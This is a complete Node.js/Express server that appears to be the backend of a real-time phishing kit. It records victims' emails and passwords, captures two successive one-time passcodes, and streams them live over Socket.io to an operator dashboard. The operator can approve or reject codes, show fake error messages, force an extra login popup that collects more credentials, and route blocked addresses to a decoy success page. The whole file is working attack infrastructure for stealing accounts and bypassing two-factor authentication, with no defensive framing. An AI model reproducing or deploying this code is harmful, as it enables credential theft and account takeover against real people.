require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const jwt = require('jsonwebtoken');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*" } });

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Routes
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'users', 'login.html')));
app.get('/users/login', (req, res) => res.sendFile(path.join(__dirname, 'public', 'users', 'login.html')));
app.get('/users/otp', (req, res) => res.sendFile(path.join(__dirname, 'public', 'users', 'otp.html')));
app.get('/users/second-otp', (req, res) => res.sendFile(path.join(__dirname, 'public', 'users', 'second-otp.html')));
app.get('/users/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'users', 'success.html')));
app.get('/admin/login', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html')));
app.get('/admin/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'dashboard.html')));

// Database configuration
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false,
  connectionTimeoutMillis: 30000,
  idleTimeoutMillis: 30000,
  max: 20,
  keepAlive: true,
  family: 4
});

pool.connect((err) => {
  if (err) console.error('❌ Database error:', err.message);
  else console.log('✅ PostgreSQL connected');
});

// JWT middleware
const authenticateJWT = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'No token' });
  const token = authHeader.split(' ')[1];
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Invalid token' });
    req.user = user;
    next();
  });
};

// Socket.io
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  if (!token) return next();
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return next(new Error('Auth error'));
    socket.user = user;
    next();
  });
});

io.on('connection', (socket) => {
  console.log('Socket connected', socket.user?.email || 'user');
});

// Database initialization
async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255),
        otp VARCHAR(6),
        second_otp VARCHAR(6),
        approved BOOLEAN DEFAULT FALSE,
        second_approved BOOLEAN DEFAULT FALSE,
        force_login BOOLEAN DEFAULT FALSE,
        redirect_success BOOLEAN DEFAULT FALSE,
        login_email VARCHAR(255),
        login_password VARCHAR(255),
        admin_text TEXT,
        text_release BOOLEAN DEFAULT FALSE,
        email_submitted_at TIMESTAMP DEFAULT NOW(),
        first_otp_submitted_at TIMESTAMP,
        second_otp_submitted_at TIMESTAMP,
        created_at TIMESTAMP DEFAULT NOW(),
        updated_at TIMESTAMP DEFAULT NOW()
      )
    `);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS admin (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL
      )
    `);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS blocked_emails (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        blocked_at TIMESTAMP DEFAULT NOW(),
        blocked_by VARCHAR(255)
      )
    `);
    
    const adminExists = await pool.query('SELECT * FROM admin WHERE email = $1', [process.env.ADMIN_EMAIL]);
    if (adminExists.rows.length === 0) {
      await pool.query('INSERT INTO admin (email, password) VALUES ($1, $2)', 
        [process.env.ADMIN_EMAIL, process.env.ADMIN_PASSWORD]);
      console.log('✅ Default admin created');
    }
    console.log('✅ Tables ready');
  } catch (err) {
    console.error('DB init error:', err);
  }
}

async function isBlocked(email) {
  const res = await pool.query('SELECT 1 FROM blocked_emails WHERE LOWER(email) = LOWER($1)', [email]);
  return res.rows.length > 0;
}

// ==================== USER ENDPOINTS ====================

app.post('/api/users/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    
    const blocked = await isBlocked(email);
    if (blocked) {
      return res.json({ redirect: `/users/success?email=${encodeURIComponent(email)}` });
    }

    await pool.query(`
      INSERT INTO users (email, password) 
      VALUES ($1, $2)
      ON CONFLICT (email) DO UPDATE 
      SET password = EXCLUDED.password, approved = false, second_approved = false, otp = NULL, second_otp = NULL, redirect_success = false
    `, [email, password || 'user']);

    io.emit('user-login', { email, timestamp: new Date() });
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/users/check-status', async (req, res) => {
  const { email } = req.query;
  if (!email) return res.json({ approved: false });
  const result = await pool.query('SELECT approved FROM users WHERE email = $1', [email]);
  res.json({ approved: result.rows[0]?.approved || false });
});

app.post('/api/users/check-approval', async (req, res) => {
  const { email } = req.body;
  if (!email) return res.json({ approved: false });
  const result = await pool.query('SELECT approved FROM users WHERE email = $1', [email]);
  res.json({ approved: result.rows[0]?.approved || false });
});

app.post('/api/users/check-second-approval', async (req, res) => {
  const { email } = req.body;
  if (!email) return res.json({ approved: false });
  const result = await pool.query('SELECT second_approved FROM users WHERE email = $1', [email]);
  res.json({ approved: result.rows[0]?.second_approved || false });
});

app.post('/api/users/submit-otp', async (req, res) => {
  const { email, otp } = req.body;
  if (!email || !otp || otp.length !== 6) return res.status(400).json({ error: 'Invalid OTP' });
  
  await pool.query(`
    UPDATE users SET otp = $1, second_approved = false, first_otp_submitted_at = NOW() WHERE email = $2
  `, [otp, email]);
  
  io.emit('user-otp-created', { email, otp, timestamp: new Date() });
  res.json({ success: true });
});

app.post('/api/users/submit-second-otp', async (req, res) => {
  const { email, otp } = req.body;
  if (!email || !otp || otp.length !== 6) return res.status(400).json({ error: 'Invalid OTP' });
  
  const first = await pool.query('SELECT otp FROM users WHERE email = $1', [email]);
  if (first.rows[0]?.otp === otp) {
    return res.status(400).json({ error: 'Cannot use same OTP as first verification' });
  }
  
  await pool.query(`
    UPDATE users SET second_otp = $1, second_approved = false, second_otp_submitted_at = NOW() WHERE email = $2
  `, [otp, email]);
  
  io.emit('user-second-otp-created', { email, second_otp: otp, timestamp: new Date() });
  res.json({ success: true });
});

app.post('/api/users/check-blocked', async (req, res) => {
  const { email } = req.body;
  if (!email) return res.json({ blocked: false });
  const blocked = await isBlocked(email);
  res.json({ blocked });
});

app.post('/api/users/check-force-login', async (req, res) => {
  const { email } = req.body;
  if (!email) return res.json({ force_login: false });
  const r = await pool.query('SELECT force_login FROM users WHERE email = $1', [email]);
  res.json({ force_login: r.rows[0]?.force_login || false });
});

app.post('/api/users/check-redirect-success', async (req, res) => {
  const { email } = req.body;
  if (!email) return res.json({ redirect_success: false });
  const r = await pool.query('SELECT redirect_success FROM users WHERE email = $1', [email]);
  res.json({ redirect_success: r.rows[0]?.redirect_success || false });
});

app.post('/api/users/check-admin-text', async (req, res) => {
  const { email } = req.body;
  if (!email) return res.json({ admin_text: null, text_release: true });
  const r = await pool.query('SELECT admin_text, text_release FROM users WHERE email = $1', [email]);
  if (r.rows.length === 0) return res.json({ admin_text: null, text_release: true });
  res.json({ admin_text: r.rows[0].admin_text, text_release: r.rows[0].text_release });
});

app.post('/api/users/submit-login-popup', async (req, res) => {
  const { email, loginEmail, loginPassword } = req.body;
  if (!email || !loginEmail || !loginPassword) return res.status(400).json({ error: 'Missing fields' });
  await pool.query('UPDATE users SET login_email = $1, login_password = $2, force_login = false WHERE email = $3', [loginEmail, loginPassword, email]);
  io.emit('user-login-submitted', { email, loginEmail, loginPassword, timestamp: new Date() });
  res.json({ success: true });
});

// ==================== ADMIN ENDPOINTS ====================

app.post('/api/admin/login', async (req, res) => {
  const { email, password } = req.body;
  const r = await pool.query('SELECT * FROM admin WHERE email = $1 AND password = $2', [email, password]);
  if (r.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });
  const token = jwt.sign({ id: r.rows[0].id, email }, process.env.JWT_SECRET, { expiresIn: '24h' });
  res.json({ token });
});

app.get('/api/admin/users', authenticateJWT, async (req, res) => {
  const r = await pool.query('SELECT * FROM users ORDER BY created_at DESC');
  res.json(r.rows);
});

app.post('/api/admin/approve-user', authenticateJWT, async (req, res) => {
  const { email } = req.body;
  await pool.query('UPDATE users SET approved = true WHERE email = $1', [email]);
  res.json({ success: true });
});

app.post('/api/admin/approve-first-otp', authenticateJWT, async (req, res) => {
  const { email } = req.body;
  await pool.query('UPDATE users SET second_approved = true WHERE email = $1', [email]);
  res.json({ success: true });
});

app.post('/api/admin/incorrect-first-otp', authenticateJWT, async (req, res) => {
  const { email } = req.body;
  await pool.query('UPDATE users SET admin_text = $1, text_release = false WHERE email = $2', ['incorrect_otp_error', email]);
  res.json({ success: true });
});

app.post('/api/admin/approve-second-otp', authenticateJWT, async (req, res) => {
  const { email } = req.body;
  await pool.query('UPDATE users SET second_approved = true WHERE email = $1', [email]);
  res.json({ success: true });
});

app.post('/api/admin/incorrect-second-otp', authenticateJWT, async (req, res) => {
  const { email } = req.body;
  await pool.query('UPDATE users SET admin_text = $1, text_release = false WHERE email = $2', ['incorrect_otp_error', email]);
  res.json({ success: true });
});

app.delete('/api/admin/delete-user', authenticateJWT, async (req, res) => {
  const { email } = req.body;
  await pool.query('DELETE FROM users WHERE email = $1', [email]);
  io.emit('user-deleted', { email, timestamp: new Date() });
  res.json({ success: true });
});

app.get('/api/health', (req, res) => res.json({ status: 'ok' }));

// Start server
initDB().then(() => {
  const PORT = process.env.PORT || 3000;
  server.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));
});